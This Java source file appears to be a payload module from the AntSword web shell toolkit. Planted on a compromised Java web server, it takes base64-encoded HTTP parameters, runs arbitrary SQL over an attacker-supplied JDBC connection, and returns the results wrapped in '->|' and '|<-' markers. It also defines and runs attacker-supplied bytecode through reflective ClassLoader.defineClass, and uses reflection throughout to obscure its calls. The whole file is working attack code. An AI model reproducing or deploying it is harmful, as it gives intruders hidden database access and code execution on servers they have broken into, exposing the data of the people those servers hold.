package database.sqlserver;

import java.lang.reflect.Field;
import java.sql.*;

public class Query {
    public Object request = null;
    public Object response = null;
    public String encoder = "base64";
    public String cs = "antswordCharset";
    public String randomPrefix = "antswordrandomPrefix";
    public String decoderClassdata;

    @Override
    public boolean equals(Object obj) {
        this.parseObj(obj);
        StringBuffer output = new StringBuffer();

        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargencode";
        String varkey2 = "antswordargconn";
        String varkey3 = "antswordargsql";
        String varkeydecoder = "antswordargdecoder";

        try {
            response.getClass().getMethod("setContentType", String.class).invoke(response, "text/html");
            request.getClass().getMethod("setCharacterEncoding", String.class).invoke(request, cs);
            response.getClass().getMethod("setCharacterEncoding", String.class).invoke(response, cs);
            String z1 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey1));
            String z2 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey2));
            String z3 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey3));
            this.decoderClassdata = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkeydecoder));
            output.append(query(z1, z2, z3));
        } catch (Exception e) {
            output.append("ERROR:// " + e);
        }
        try {
            Object writer = response.getClass().getMethod("getWriter").invoke(response);
            writer.getClass().getMethod("print", String.class).invoke(writer, tag_s + this.asoutput(output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("base64")) {
            return new String(this.Base64DecodeToByte(str), this.cs);
        }
        return str;
    }

    String Base64Encode(String str) {
        String version = System.getProperty("java.version");
        try {
            String ret = "";
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64);
                ret = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, str.getBytes());
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = Base64.getDeclaredConstructor().newInstance();
                ret = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, str.getBytes());
            }
            ret = ret.replaceAll("\r|\n", "");
            return ret;
        } catch (Exception e) {
            return "";
        }
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1];
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        boolean isRS = stmt.execute(sql);
        if (isRS) {
            ResultSet rs = stmt.getResultSet();
            ResultSetMetaData rsmd = rs.getMetaData();

            if (needcoluname) {
                for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                    String columnName = rsmd.getColumnName(i);
                    ret += columnName + columnsep;
                }
                ret += rowsep;
            }

            while (rs.next()) {
                for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                    String columnValue = rs.getString(i);
                    ret += Base64Encode(columnValue) + columnsep;
                }
                ret += rowsep;
            }
        } else {
            ret += "Result" + columnsep + rowsep;
            int rowCount = stmt.getUpdateCount();
            if (rowCount > 0) {
                ret += Base64Encode("Rows changed = " + rowCount) + columnsep + rowsep;
            } else if (rowCount == 0) {
                ret += Base64Encode("No rows changed or statement was DDL command") + columnsep + rowsep;
            } else {
                ret += Base64Encode("False") + columnsep + rowsep;
            }
        }
        return ret;
    }

    String query(String encode, String conn, String sql) throws Exception {
        String columnsep = "\t|\t";
        String rowsep = "\r\n";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) obj;
            request = data[0];
            response = data[1];
        } else {
            try {
                request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
                response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                request = obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    Object request2 = req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }
    }

    public String asoutput(String str) {
        try {
            byte[] classBytes = Base64DecodeToByte(decoderClassdata);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
            return cc.getConstructor(String.class).newInstance(str).toString();
        } catch (Exception e) {
            return str;
        }
    }

    public byte[] Base64DecodeToByte(String str) {
        byte[] bt = null;
        String version = System.getProperty("java.version");
        try {
            if (version.compareTo("1.9") >= 0) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            } else {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            }
            return bt;
        } catch (Exception e) {
            return new byte[]{};
        }
    }
}